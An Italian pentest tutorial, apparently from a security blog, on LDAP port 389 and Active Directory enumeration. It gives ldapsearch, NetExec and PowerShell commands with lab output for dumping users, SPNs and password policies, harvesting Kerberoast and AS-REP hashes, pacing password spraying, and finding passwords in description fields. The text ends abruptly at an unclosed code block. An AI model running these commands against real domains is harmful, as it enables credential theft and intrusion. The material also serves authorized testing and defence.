---
title: 'Porta 389 LDAP: Cos’è, Come Funziona e Pentest in AD'
slug: porta-389-ldap
description: 'LDAPS sulla 636, server LDAP, autenticazione LDAP, query e filtri, null bind, utenti e SPN, credenziali esposte, signing, relay, injection e misconfigurazioni.'
image: /9ac49e51-a47e-4a10-8cba-b8fca57b2f64.webp
draft: false
date: 2026-02-01T00:00:00.000Z
categories:
  - windows
subcategories:
  - active-directory
tags:
  - LDAP
  - Active Directory
  - ldapsearch
  - Enumerazione LDAP
  - LDAPS
featured: true
---

# LDAP: Guida a Protocollo, Porte, Enumerazione e Pentest di Active Directory

**LDAP è il protocollo che serve a interrogare e modificare una directory di utenti, gruppi e computer.** `Lightweight Directory Access Protocol`, il significato è: protocollo leggero per accedere alle directory. Sulla **porta 389** viaggia in chiaro, sulla **porta 636** viaggia dentro TLS (LDAPS), mentre le **porte 3268 e 3269** servono per il Global Catalog di Active Directory. In una rete Windows ogni Domain Controller espone LDAP: per questo è uno dei primi servizi che guardi in un pentest interno.

In questa guida trovi cos'è LDAP, come funziona, a cosa servono le porte 389, 636, 3268 e 3269, come funziona l'autenticazione LDAP e come si fa l'enumerazione di Active Directory con `ldapsearch`, `nxc` e PowerShell. Poi vedi le tecniche offensive (null bind, pass-back, LDAP relay, injection), il rilevamento e come difendersi. Gli output degli esempi sono illustrativi: nel tuo lab cambieranno nomi, domini e numeri.

**3 punti chiave**

* Una query LDAP può restituire utenti, gruppi, computer e SPN di tutto il dominio: i dati servono per Kerberoasting, password spraying e privilege escalation
* Su Active Directory l'accesso anonimo alla sola RootDSE è normale: non significa che il null bind sia aperto sugli altri oggetti
* Le difese che contano sono LDAP signing, channel binding e LDAPS; la porta 389 aperta, da sola, non è una vulnerabilità

## Cos'è LDAP e a Cosa Serve

LDAP è un protocollo client-server: un client invia una richiesta a un server LDAP, che risponde con le voci della directory che corrispondono alla ricerca. Serve soprattutto per tre cose: **autenticare** gli utenti, **cercare** informazioni (nome, email, gruppi, computer) e **centralizzare** gli account di una rete.

La directory è organizzata ad albero. Questi sono i termini che ti servono per leggere qualsiasi output:

| Termine              | Cosa significa                                                                              | Esempio                                     |
| -------------------- | ------------------------------------------------------------------------------------------- | ------------------------------------------- |
| Entry                | Una voce della directory (utente, gruppo, computer)                                         | L'utente John Smith                         |
| `Distinguished Name` | Il significato è: nome distintivo, cioè il percorso completo di un oggetto nell'albero (DN) | `CN=John Smith,OU=IT,DC=corp,DC=local`      |
| Base DN              | Il punto da cui parte la ricerca                                                            | `DC=corp,DC=local`                          |
| Attributo            | Un dato dentro l'entry                                                                      | `sAMAccountName`, `memberOf`, `description` |
| `objectClass`        | Il tipo dell'oggetto                                                                        | `user`, `group`, `computer`                 |
| Scope                | Quanto in profondità cercare: `base`, `one`, `sub`                                          | `sub` = tutto il sottoalbero                |
| Filtro               | La condizione della ricerca                                                                 | `(objectClass=user)`                        |

Dove lo trovi: **Active Directory** (Windows), **OpenLDAP** (Linux), e molte appliance, stampanti, NAS e VPN che usano LDAP per verificare gli utenti. Su un server LDAP Linux il demone si chiama `slapd` e di solito ascolta sulle porte 389 e 636.

**LDAP e Active Directory.** Active Directory non è LDAP: AD è il servizio di directory di Microsoft e *parla* LDAP (oltre a Kerberos, DNS e SMB). OpenLDAP è un altro server LDAP, usato su Linux. Con LDAP interroghi entrambi, ma gli attributi cambiano: su AD cerchi `sAMAccountName`, su OpenLDAP cerchi `uid`.

**LDAP, SAML e OAuth.** LDAP verifica credenziali e interroga una directory dentro la rete aziendale. SAML e OAuth servono per il login su applicazioni web e cloud (single sign-on): non si sostituiscono, spesso convivono e il provider SAML legge gli utenti proprio da una directory LDAP.

**Browser LDAP.** Se preferisci una GUI, un browser LDAP come Apache Directory Studio ti fa esplorare l'albero, i DN e gli attributi senza scrivere filtri a mano. Utile per capire la struttura, poi passa alla riga di comando.

## Porte LDAP: 389, 636, 3268 e 3269

La domanda "che porta usa LDAP" ha cinque risposte, ciascuna con un ruolo.

| Porta    | Nome                  | Cifratura                    | A cosa serve                                                                                       |
| -------- | --------------------- | ---------------------------- | -------------------------------------------------------------------------------------------------- |
| 389/TCP  | LDAP                  | No (chiaro), oppure StartTLS | La porta LDAP standard, interroga un singolo dominio                                               |
| 389/UDP  | CLDAP                 | No                           | LDAP senza connessione, usato da AD per localizzare i Domain Controller                            |
| 636/TCP  | LDAPS                 | TLS dall'inizio              | LDAP cifrato, la porta LDAP sicura                                                                 |
| 3268/TCP | `Global Catalog`      | No                           | Il significato è: catalogo globale. Interroga l'intera foresta AD con un sottoinsieme di attributi |
| 3269/TCP | Global Catalog su TLS | TLS                          | Come la 3268, ma cifrata                                                                           |

Come ragionare sulle porte:

* **Porta 389 LDAP:** in chiaro per default. Le credenziali di un simple bind passano in chiaro, e chiunque sia sul percorso con [Wireshark](https://hackita.it/articoli/wireshark/) o [tcpdump](https://hackita.it/articoli/tcpdump/) le legge. La stessa porta può però passare a TLS con `StartTLS`, il significato è: avvio di TLS sulla connessione già aperta.
* **Porta 636 LDAPS:** la connessione nasce già cifrata. Il Domain Controller deve avere un certificato valido. Approfondimento: [porta 636 LDAPS](https://hackita.it/articoli/porta-636-ldaps/).
* **Porta 3268 e 3269:** il Global Catalog contiene una copia parziale di tutti gli oggetti della foresta. È la porta giusta se hai più domini e vuoi cercare utenti o gruppi cross-domain.
* **LDAP vs LDAPS:** stesso protocollo, cambia il trasporto. LDAPS cifra tutto dall'handshake, StartTLS cifra dopo un upgrade sulla 389. Per un pentester la differenza pratica è doppia: sul chiaro sniffi, sul cifrato no; e un Domain Controller con signing richiesto rifiuta i simple bind in chiaro.

Una porta aperta non è una vulnerabilità. Conta cosa ti lascia fare: bind anonimo, bind semplice in chiaro, signing non richiesto, attributi leggibili.

### LDAP vs LDAPS vs StartTLS: le Differenze

LDAPS e StartTLS cifrano entrambi con TLS, ma la cifratura parte in momenti diversi. Il nome `LDAP over SSL` indica LDAPS: oggi si usa TLS, ma il nome vecchio è rimasto.

| Modalità              | Porta    | Quando parte la cifratura                 | Cosa vedi in rete                       |
| --------------------- | -------- | ----------------------------------------- | --------------------------------------- |
| LDAP in chiaro        | 389/TCP  | Mai                                       | DN e password del simple bind leggibili |
| LDAPS                 | 636/TCP  | Subito, prima di qualsiasi messaggio LDAP | Solo traffico cifrato                   |
| StartTLS              | 389/TCP  | Dopo che il client chiede l'upgrade       | I primi pacchetti in chiaro, poi TLS    |
| Global Catalog su TLS | 3269/TCP | Subito                                    | Come LDAPS, per tutta la foresta        |

StartTLS non è un protocollo diverso: è un'operazione LDAP (RFC 4511) che trasforma la connessione già aperta sulla 389 in una connessione TLS. Per questo lo trovi scritto come "LDAP sulla 389 con StartTLS".

### Come Testare la Connessione LDAPS e StartTLS

```bash
# LDAPS: show the certificate sent by the server
openssl s_client -connect 10.10.10.10:636 -showcerts </dev/null

# StartTLS on port 389 (needs a recent OpenSSL)
openssl s_client -connect 10.10.10.10:389 -starttls ldap </dev/null

# Certificate details with nmap
nmap -p 636 --script ssl-cert 10.10.10.10

# ldapsearch with StartTLS: -ZZ fails if the upgrade to TLS fails
LDAPTLS_REQCERT=never ldapsearch -x -ZZ -H ldap://dc01.corp.local -b "" -s base defaultNamingContext
```

Se `openssl` mostra il certificato, il TLS funziona: controlla scadenza, nome (`subject` e `subjectAltName`) e chi lo ha emesso. Se si ferma con un errore di handshake, il Domain Controller non ha un certificato valido per LDAPS oppure la porta è filtrata. Con `-ZZ` la prova è semplice: se la query funziona solo senza `-ZZ`, StartTLS non è disponibile.

### Global Catalog: Porta 3268 vs 389

La 389 interroga il dominio del Domain Controller a cui sei collegato. La 3268 interroga il `Global Catalog`, il significato è: catalogo globale, cioè una copia di sola lettura di tutti gli oggetti della foresta con solo alcuni attributi (`Partial Attribute Set`, il significato è: insieme parziale di attributi).

|                  | Porta 389                       | Porta 3268                                                           |
| ---------------- | ------------------------------- | -------------------------------------------------------------------- |
| Ambito           | Un dominio                      | Tutta la foresta                                                     |
| Attributi        | Tutti                           | Solo il sottoinsieme replicato nel Global Catalog                    |
| Versione cifrata | 636 (oppure StartTLS)           | 3269                                                                 |
| Quando usarla    | Dettagli completi di un oggetto | Trovare un utente o un gruppo senza sapere in quale dominio si trova |

```bash
# Find a user anywhere in the forest through the Global Catalog (port 3268)
ldapsearch -x -H ldap://10.10.10.10:3268 -D "corp\jsmith" -w "Password1" -b "DC=corp,DC=local" "(sAMAccountName=svc_sql)" sAMAccountName mail
```

Trovato l'oggetto, per leggere gli attributi che nel Global Catalog mancano devi interrogare il Domain Controller del suo dominio sulla 389.

### Come trovare il server LDAP

In una rete Active Directory i Domain Controller sono annunciati dal DNS:

```bash
# Find the domain controllers through DNS SRV records
dig -t SRV _ldap._tcp.dc._msdcs.corp.local @10.10.10.10

# Or scan the subnet for LDAP ports
nmap -p 389,636,3268,3269 --open -Pn 10.10.10.0/24
```

Per controllare la connessione verso un server LDAP da Linux:

```bash
nc -vz 10.10.10.10 389
ldapsearch -x -H ldap://10.10.10.10 -b "" -s base namingContexts
```

Se la prima risponde ma la seconda no, il problema è LDAP (bind o policy), non la rete.

## 1. Anatomia Tecnica della Porta 389

La porta 389 è registrata IANA come `ldap` su TCP e UDP. Su TCP è LDAP vero e proprio; su UDP è CLDAP, che Active Directory usa soprattutto per il `DC locator`, il significato è: localizzatore di Domain Controller. Il flusso di una sessione LDAP:

1. **TCP handshake** sulla porta 389
2. **Bind request**: il client si autentica (simple bind, SASL o anonymous)
3. **Search request**: query con base DN, scope, filtro e attributi richiesti
4. **Search result**: il server restituisce le entry che corrispondono
5. **Unbind**: chiusura della sessione

Le varianti operative sono LDAP in chiaro (porta 389), LDAPS con TLS nativo (porta 636), LDAP con StartTLS (porta 389 con upgrade) e Global Catalog (porte 3268 e 3269 per ricerche cross-domain).

### Porta LDAP 389: TCP e UDP (CLDAP)

La stessa porta 389 si usa in due modi. Su **TCP** è LDAP vero e proprio, con bind e ricerche. Su **UDP** è `CLDAP`, il significato è: LDAP senza connessione. Il client manda un solo pacchetto (il "Netlogon ping") e il Domain Controller risponde con nome del dominio, nome del DC e sito, senza bind. Windows lo usa per scegliere il DC più vicino. In un pentest `nmap -sU -p 389` ti conferma che il DC risponde su CLDAP. L'UDP 389 aperto verso Internet è un problema: CLDAP è stato abusato per attacchi DDoS di tipo reflection.

## Autenticazione LDAP: i Tipi di Bind

Con LDAP "autenticarsi" si dice `bind`, il significato è: associazione, cioè la richiesta con cui il client dice al server chi è. Sono i quattro modi che incontri:

| Tipo di bind    | Come funziona                                             | Nota per il pentest                                                                 |
| --------------- | --------------------------------------------------------- | ----------------------------------------------------------------------------------- |
| Anonymous       | Nessuna identità                                          | Su AD funziona sulla RootDSE; sul resto dipende dalla configurazione                |
| Unauthenticated | DN presente, password vuota                               | Alcuni server lo trattano come anonimo; un'app può scambiarlo per un login riuscito |
| Simple          | DN e password                                             | In chiaro sulla 389: cifralo con LDAPS o StartTLS                                   |
| SASL            | Meccanismi come GSSAPI (Kerberos), GSS-SPNEGO, DIGEST-MD5 | È il bind usato da Windows, supporta il signing                                     |

Un DC con *LDAP server signing requirements* impostato su "Require signing" rifiuta i simple bind su connessioni non cifrate. Quindi se un `ldapsearch -x -D ... -w ...` sulla 389 fallisce con un errore di strong authentication, il comando non è sbagliato: devi usare LDAPS, StartTLS (`-ZZ`) o SASL.

## Cos'è la RootDSE e Perché Non Prova il Null Bind

La `RootDSE`, il significato è: voce radice del server DSE, è una entry speciale che ogni server LDAP espone: contiene i naming context, il livello funzionale, il nome host e i meccanismi SASL supportati. **Su Active Directory risponde anche senza credenziali, sempre.** Per questo una query alla RootDSE che funziona NON dimostra che il null bind sia abilitato sugli altri oggetti.

Quello che conta è la ricerca anonima sull'albero:

* RootDSE anonima: normale, non è una misconfigurazione
* Ricerca anonima di utenti e gruppi: richiede che `dsHeuristics` sia stato modificato e che ad `ANONYMOUS LOGON` siano stati dati permessi di lettura. È una misconfigurazione reale
* Su OpenLDAP la situazione dipende dalle ACL del server: spesso la directory è leggibile senza bind

### Gli Attributi della RootDSE Che Contano

```bash
ldapsearch -x -H ldap://10.10.10.10 -b "" -s base defaultNamingContext rootDomainNamingContext configurationNamingContext schemaNamingContext supportedSASLMechanisms dnsHostName
```

| Attributo                                     | Cosa ti dice                                                          |
| --------------------------------------------- | --------------------------------------------------------------------- |
| `defaultNamingContext`                        | Il dominio del DC: è il Base DN da usare nelle ricerche               |
| `rootDomainNamingContext`                     | Il dominio radice della foresta                                       |
| `configurationNamingContext`                  | La partizione Configuration (siti, servizi, template dei certificati) |
| `schemaNamingContext`                         | Lo schema: classi e attributi disponibili                             |
| `supportedSASLMechanisms`                     | I meccanismi SASL accettati (GSSAPI, GSS-SPNEGO e altri)              |
| `dnsHostName`                                 | Il nome DNS del DC: serve per Kerberos                                |
| `domainFunctionality` e `forestFunctionality` | Il livello funzionale di dominio e foresta                            |

### Anonimo, Non Autenticato e Null Bind: Non Sono la Stessa Cosa

| Cosa                         | Cosa succede                                               | È una misconfigurazione?                                                        |
| ---------------------------- | ---------------------------------------------------------- | ------------------------------------------------------------------------------- |
| Accesso anonimo alla RootDSE | Leggi i metadati del server senza credenziali              | No, è normale su AD                                                             |
| Anonymous bind               | Il client si presenta senza identità (DN e password vuoti) | Dipende da cosa può leggere dopo                                                |
| Unauthenticated bind         | DN presente, password vuota                                | Spesso rifiutato; il rischio sono le app che lo scambiano per un login riuscito |
| Accesso anonimo agli oggetti | Leggi utenti e gruppi senza credenziali                    | Sì: su AD non è il default                                                      |

## Misconfigurazioni LDAP: Impatto e Verifica

| Misconfigurazione                                            | Impatto                                                                                                                | Come si verifica                                                                                                         |
| ------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------ |
| **Anonymous bind con ricerca aperta**                        | Interroghi la directory senza credenziali: può esporre utenti, gruppi, OU e computer, in base ai permessi              | `ldapsearch -x -H ldap://10.10.10.10 -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName`                          |
| **LDAP signing non obbligatorio**                            | Le connessioni LDAP sono esposte a relay e Man-in-the-Middle, se sono soddisfatte le condizioni necessarie             | Policy *Domain controller: LDAP server signing requirements* sul DC, eventi 2889 e 2887 nel registro *Directory Service* |
| **Channel binding non richiesto**                            | Il relay verso LDAPS può restare possibile: solo `Always` lo chiude                                                    | Policy *LDAP server channel binding token requirements* o chiave `LdapEnforceChannelBinding`                             |
| **Attributi sensibili leggibili da utenti non privilegiati** | Credenziali archiviate male in `description`, `comment` o attributi custom, leggibili da qualsiasi account autenticato | `ldapsearch -x -H ldap://10.10.10.10 -D "corp\jsmith" -W -b "DC=corp,DC=local" "(objectClass=user)" description comment` |
| **MachineAccountQuota maggiore di zero**                     | Qualsiasi utente di dominio può creare computer account: serve per RBCD via relay                                      | Attributo `ms-DS-MachineAccountQuota` sull'oggetto dominio (default 10)                                                  |

### Note operative

**Anonymous bind:** lo script `ldap-rootdse` di nmap e il comando sulla RootDSE raccolgono informazioni, ma non dicono se la ricerca anonima sia aperta: devi provare la ricerca su un base DN reale.

**LDAP signing:** nmap non conferma da solo se la firma sia obbligatoria. Controlla la policy sul DC e gli eventi nel registro *Directory Service*. Windows Server 2025 ha default più restrittivi delle versioni precedenti: verifica sempre sul DC reale.

**Attributi sensibili:** usa un account di test autorizzato e verifica quali attributi siano leggibili. L'opzione `-W` chiede la password in modo interattivo, senza lasciarla nella cronologia della shell (negli esempi di lab uso `-w` per brevità).

Tutte le verifiche vanno eseguite esclusivamente su sistemi per i quali hai l'autorizzazione.

## Signing, Channel Binding e Relay: Cosa Protegge Cosa

Sono due difese diverse e non si sostituiscono. Il **signing** firma i messaggi della sessione LDAP in chiaro (porta 389). Il **channel binding** (`CBT`, il significato è: token di associazione al canale) lega l'autenticazione alla sessione TLS e vale per LDAPS (porta 636): senza, un'autenticazione NTLM rilanciata da un attaccante verso LDAPS può essere accettata.

| Scenario                                            | Cosa protegge                                                | Relay NTLM verso il DC                                               |
| --------------------------------------------------- | ------------------------------------------------------------ | -------------------------------------------------------------------- |
| Simple bind su 389                                  | Niente: la password è in chiaro                              | Non serve: la sniffi                                                 |
| NTLM su 389, signing non richiesto                  | Niente sulla sessione                                        | Possibile, se il client non ha negoziato il signing                  |
| NTLM su 389, signing richiesto                      | Ogni messaggio è firmato                                     | Chiuso verso la 389                                                  |
| LDAPS, channel binding `Never` (il default storico) | La cifratura TLS, ma l'autenticazione non è legata al canale | Possibile verso la 636                                               |
| LDAPS, channel binding `When supported`             | Controlla il token solo se il client lo invia                | Passa chi non lo invia: serve per l'audit (eventi 3039, 3074 e 3075) |
| LDAPS, channel binding `Always`                     | L'autenticazione è legata alla sessione TLS                  | Chiuso verso la 636                                                  |

Da ricordare: il signing chiude il relay verso la 389, il channel binding chiude quello verso la 636. Per bloccare il vettore servono tutti e due.

## 2. Enumerazione LDAP di Base

L'enumerazione base parte dalla verifica del servizio e dalla raccolta dei naming context. Questi dati ti dicono quale dominio AD stai interrogando.

### Comando 1: Nmap

```bash
nmap -sV -sC -p 389 10.10.10.10
```

**Output atteso:**

```text
PORT    STATE SERVICE VERSION
389/tcp open  ldap    Microsoft Windows Active Directory LDAP (Domain: corp.local0., Site: Default-First-Site-Name)
| ldap-rootdse:
|   domainFunctionality: 7
|   forestFunctionality: 7
|   domainControllerFunctionality: 7
|   rootDomainNamingContext: DC=corp,DC=local
|   ldapServiceName: corp.local:dc01$@CORP.LOCAL
|   supportedLDAPVersion: 3, 2
|   supportedSASLMechanisms: GSSAPI, GSS-SPNEGO, EXTERNAL, DIGEST-MD5
|_  dnsHostName: DC01.corp.local
```

**Parametri:**

* `-sV`: identifica il servizio LDAP e il tipo (AD, OpenLDAP, ecc.)
* `-sC`: esegue `ldap-rootdse`, che estrae naming context, livello funzionale e hostname del DC
* `-p 389`: scansione sulla porta LDAP standard

### Comando 2: ldapsearch sulla RootDSE

```bash
ldapsearch -x -H ldap://10.10.10.10 -b "" -s base namingContexts
```

**Output atteso:**

```text
# extended LDIF
dn:
namingContexts: DC=corp,DC=local
namingContexts: CN=Configuration,DC=corp,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=corp,DC=local
namingContexts: DC=DomainDnsZones,DC=corp,DC=local
namingContexts: DC=ForestDnsZones,DC=corp,DC=local
```

**Cosa ci dice questo output:** il server ha risposto senza credenziali e hai i naming context completi: dominio (`DC=corp,DC=local`), configurazione, schema e zone DNS. Ogni naming context è un punto di partenza per query mirate, e `corp.local` è il dominio target per tutto il resto. Ricorda: su AD questo risultato è normale e non prova il null bind. Per quello serve la ricerca anonima della sezione "Tecniche Offensive". Il comando `ldapsearch` ha anche una guida dedicata: [ldapsearch](https://hackita.it/articoli/ldapsearch/).

## Ricerca LDAP e Query LDAP: Filtri e Sintassi

Una query LDAP si compone di base DN, scope, filtro e attributi. Il filtro usa una sintassi a prefisso, tra parentesi:

| Operatore | Significato      | Esempio                                             |
| --------- | ---------------- | --------------------------------------------------- |
| `=`       | Uguale           | `(sAMAccountName=jsmith)`                           |
| `*`       | Qualsiasi valore | `(servicePrincipalName=*)`                          |
| `&`       | AND              | `(&(objectClass=user)(adminCount=1))`               |
| `\|`      | OR               | `(\|(sAMAccountName=admin*)(sAMAccountName=svc*))`  |
| `!`       | NOT              | `(!(userAccountControl:1.2.840.113556.1.4.803:=2))` |

L'ultimo esempio usa una regola di confronto bit a bit (`1.2.840.113556.1.4.803`) sull'attributo `userAccountControl`: il filtro scarta gli account disabilitati (bit `2`).

Altri operatori che ti servono per leggere e scrivere filtri:

| Operatore      | Significato                                     | Esempio                            |
| -------------- | ----------------------------------------------- | ---------------------------------- |
| `=*`           | Presenza: l'attributo esiste                    | `(mail=*)`                         |
| `=testo*testo` | Sottostringa                                    | `(cn=*admin*)`                     |
| `>=`           | Maggiore o uguale                               | `(whenCreated>=20260101000000.0Z)` |
| `<=`           | Minore o uguale                                 | `(logonCount<=1)`                  |
| `~=`           | Corrispondenza approssimata: dipende dal server | `(cn~=smith)`                      |

Se l'input arriva da un utente, i caratteri `*`, `(`, `)` e `\` vanno protetti con l'escape (vedi la sezione LDAP Injection). Il filtro e il DN hanno regole di escape diverse.

### Esempi di Filtri LDAP per il Pentest

| Cosa cerchi                                                 | Filtro                                                                                             |
| ----------------------------------------------------------- | -------------------------------------------------------------------------------------------------- |
| Account con SPN (Kerberoasting)                             | `(&(objectClass=user)(servicePrincipalName=*))`                                                    |
| Account senza pre-autenticazione Kerberos (AS-REP roasting) | `(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))` |
| Account con delega non vincolata                            | `(userAccountControl:1.2.840.113556.1.4.803:=524288)`                                              |
| Account con delega vincolata                                | `(msDS-AllowedToDelegateTo=*)`                                                                     |
| Account privilegiati (adminCount)                           | `(&(objectClass=user)(adminCount=1))`                                                              |
| Password nella description                                  | `(&(objectClass=user)(description=*pass*))`                                                        |
| Utenti con password che non scade                           | `(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))`                          |
| Computer del dominio                                        | `(objectClass=computer)`                                                                           |
| Trust tra domini                                            | `(objectClass=trustedDomain)`                                                                      |

Approfondimenti sugli attacchi collegati: [Kerberoasting](https://hackita.it/articoli/kerberoasting/) e [AS-REP Roasting](https://hackita.it/articoli/as-rep-roasting/).

### Query LDAP con PowerShell

Da una macchina Windows non serve nessun tool esterno. Il tipo `[adsisearcher]` lancia una query LDAP direttamente:

```powershell
# Search all users with an SPN, using only built-in .NET
$searcher = [adsisearcher]"(&(objectClass=user)(servicePrincipalName=*))"
$searcher.PropertiesToLoad.AddRange(@("samaccountname","serviceprincipalname"))
$searcher.FindAll() | ForEach-Object { $_.Properties }

# Same query with the ActiveDirectory module
Get-ADUser -LDAPFilter "(servicePrincipalName=*)" -Properties servicePrincipalName
```

La versione con `[adsisearcher]` è utile perché usa solo componenti già presenti in Windows. Il modulo `ActiveDirectory` è più comodo ma è presente di solito solo sui server o dove sono installati gli RSAT.

## 3. Enumerazione Avanzata

### Dump completo degli utenti del dominio

Con credenziali valide (anche a bassi privilegi) puoi estrarre tutti gli account utente del dominio. Per ottenere un primo set di credenziali guarda la [guida al password spraying](https://hackita.it/articoli/password-spraying/).

```bash
ldapsearch -x -H ldap://10.10.10.10 -D "corp\jsmith" -w "Password1" -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName userPrincipalName memberOf description pwdLastSet userAccountControl
```

**Output:**

```text
dn: CN=John Smith,OU=IT,DC=corp,DC=local
sAMAccountName: jsmith
userPrincipalName: jsmith@corp.local
memberOf: CN=Domain Users,CN=Users,DC=corp,DC=local
memberOf: CN=IT-Admins,OU=Groups,DC=corp,DC=local
description: Temp password: Welcome1!
pwdLastSet: 133500000000000000
userAccountControl: 512

dn: CN=SQL Service,OU=Service Accounts,DC=corp,DC=local
sAMAccountName: svc_sql
userPrincipalName: svc_sql@corp.local
memberOf: CN=Domain Users,CN=Users,DC=corp,DC=local
description: SQL Server service account
pwdLastSet: 132800000000000000
userAccountControl: 66048
```

**Lettura dell'output:** `jsmith` è membro di `IT-Admins`, un gruppo privilegiato, e la description contiene una password temporanea (`Welcome1!`). L'account `svc_sql` ha `userAccountControl: 66048`, cioè `DONT_EXPIRE_PASSWORD` (65536) più account normale (512), e la password non è stata cambiata da tempo (`pwdLastSet` basso). Entrambi sono target prioritari.

Se il Domain Controller richiede il signing e il comando sulla 389 fallisce, usa una connessione cifrata:

```bash
# LDAPS on port 636, ignoring the certificate check in a lab
LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://10.10.10.10:636 -D "corp\jsmith" -w "Password1" -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName

# StartTLS on port 389
LDAPTLS_REQCERT=never ldapsearch -x -ZZ -H ldap://dc01.corp.local -D "corp\jsmith" -w "Password1" -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName

# SASL GSSAPI (Kerberos), needs a ticket and the FQDN
kinit jsmith@CORP.LOCAL
ldapsearch -Y GSSAPI -H ldap://dc01.corp.local -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName
```

### Estrazione di tutti i Service Principal Names (SPN)

Gli SPN sono la chiave del [Kerberoasting](https://hackita.it/articoli/kerberoasting/), la tecnica che richiede un ticket di servizio e ne crackka offline la password. Per il contesto generale su Kerberos: [Kerberos](https://hackita.it/articoli/kerberos/).

```bash
ldapsearch -x -H ldap://10.10.10.10 -D "corp\jsmith" -w "Password1" -b "DC=corp,DC=local" "(servicePrincipalName=*)" sAMAccountName servicePrincipalName
```

**Output:**

```text
dn: CN=SQL Service,OU=Service Accounts,DC=corp,DC=local
sAMAccountName: svc_sql
servicePrincipalName: MSSQLSvc/sql01.corp.local:1433
servicePrincipalName: MSSQLSvc/sql01.corp.local

dn: CN=HTTP Service,OU=Service Accounts,DC=corp,DC=local
sAMAccountName: svc_web
servicePrincipalName: HTTP/web01.corp.local
```

**Lettura dell'output:** due service account con SPN. `svc_sql` espone MSSQLSvc: puoi richiedere un TGS per questo SPN e tentare il crack offline della password. `svc_web` espone HTTP: stesso approccio. Gli account di servizio con SPN sono spesso configurati con password deboli o mai cambiate.

### Enumerazione della policy delle password e del lockout

```bash
ldapsearch -x -H ldap://10.10.10.10 -D "corp\jsmith" -w "Password1" -b "DC=corp,DC=local" "(objectClass=domainDNS)" lockoutThreshold lockoutDuration pwdHistoryLength minPwdLength maxPwdAge
```

**Output:**

```text
dn: DC=corp,DC=local
lockoutThreshold: 5
lockoutDuration: -18000000000
pwdHistoryLength: 12
minPwdLength: 8
maxPwdAge: -36288000000000
```

**Lettura dell'output:** blocco dopo 5 tentativi falliti, durata del blocco 30 minuti (`-18000000000` in intervalli da 100 nanosecondi), password minima di 8 caratteri, storico di 12 password, scadenza a 42 giorni. Questi parametri calibrano il tuo [attacco di password spraying](https://hackita.it/articoli/password-spraying/): al massimo 4 tentativi per utente, poi aspetta 31 minuti. Questa è la policy di dominio di default: le Fine-Grained Password Policy possono dare regole diverse ad alcuni utenti.

### Ricerca di computer e Domain Controller

```bash
ldapsearch -x -H ldap://10.10.10.10 -D "corp\jsmith" -w "Password1" -b "DC=corp,DC=local" "(objectClass=computer)" cn operatingSystem operatingSystemVersion dNSHostName
```

**Output:**

```text
dn: CN=DC01,OU=Domain Controllers,DC=corp,DC=local
cn: DC01
operatingSystem: Windows Server 2022 Standard
operatingSystemVersion: 10.0 (20348)
dNSHostName: DC01.corp.local

dn: CN=WS-DEV-01,OU=Workstations,DC=corp,DC=local
cn: WS-DEV-01
operatingSystem: Windows 11 Enterprise
operatingSystemVersion: 10.0 (22631)
dNSHostName: WS-DEV-01.corp.local
```

**Lettura dell'output:** mappa completa dei computer del dominio con sistema operativo e versione. Puoi filtrare i sistemi vecchi e vulnerabili (Windows Server 2012, Windows 7) o individuare le workstation degli sviluppatori (target per il credential harvesting).

### Enumerazione con NetExec

Per un'enumerazione veloce di tutto il dominio, [NetExec](https://hackita.it/articoli/netexec/) (`nxc`) ha un modulo LDAP già pronto. È il successore di [CrackMapExec](https://hackita.it/articoli/crackmapexec/) e gestisce da solo signing e LDAPS:

```bash
nxc ldap 10.10.10.10 -u jsmith -p 'Password1' --users
nxc ldap 10.10.10.10 -u jsmith -p 'Password1' --groups
nxc ldap 10.10.10.10 -u jsmith -p 'Password1' --kerberoasting kerberoast.txt
nxc ldap 10.10.10.10 -u jsmith -p 'Password1' --asreproast asrep.txt
nxc ldap 10.10.10.10 -u jsmith -p 'Password1' -M maq
nxc ldap 10.10.10.10 -u jsmith -p 'Password1' -M get-desc-users
```

`-M maq` legge `MachineAccountQuota` (serve per il relay con RBCD) e `-M get-desc-users` cerca le password nelle description. Con le stesse credenziali, [BloodHound](https://hackita.it/articoli/bloodhound/) usa LDAP per costruire il grafo dei percorsi d'attacco: il collector generico produce molte query, per questo è facile da rilevare.

### Cosa Cercare Oltre gli Utenti: i Target da Pentest

Con un account a bassi privilegi, LDAP ti dice anche dove sono i percorsi verso il Domain Admin. Questi sono gli oggetti che contano:

| Cosa cerchi                         | Filtro o attributo                                                                                                                              | Perché conta                                                                                                                                                                      |
| ----------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Password LAPS leggibile             | `(ms-Mcs-AdmPwd=*)` (LAPS legacy) oppure `msLAPS-Password` (Windows LAPS)                                                                       | Se il tuo account la legge, hai la password dell'amministratore locale. Se non hai il permesso, la query torna vuota                                                              |
| gMSA                                | `(objectClass=msDS-GroupManagedServiceAccount)` e attributo `msDS-GroupManagedServiceAccountPassword`                                           | Chi può leggerlo ottiene l'hash NT del service account                                                                                                                            |
| Account senza password obbligatoria | `(userAccountControl:1.2.840.113556.1.4.803:=32)`                                                                                               | Alcuni hanno la password vuota                                                                                                                                                    |
| RBCD già configurata                | `(msDS-AllowedToActOnBehalfOfOtherIdentity=*)`                                                                                                  | Mostra chi può impersonare utenti verso quel computer                                                                                                                             |
| Template dei certificati (ADCS)     | base `CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local` con `(objectClass=pKICertificateTemplate)` | Punto di partenza per cercare template vulnerabili con [Certipy](https://hackita.it/articoli/certipy/)                                                                            |
| Permessi sugli oggetti (ACL)        | attributo `nTSecurityDescriptor`                                                                                                                | Dice chi ha `GenericAll` o `WriteDacl`. È un dato binario: lo leggi con [BloodyAD](https://hackita.it/articoli/bloodyad/) o [BloodHound](https://hackita.it/articoli/bloodhound/) |
| GPO                                 | `(objectClass=groupPolicyContainer)`                                                                                                            | Elenca le policy e dove puoi scrivere                                                                                                                                             |

```bash
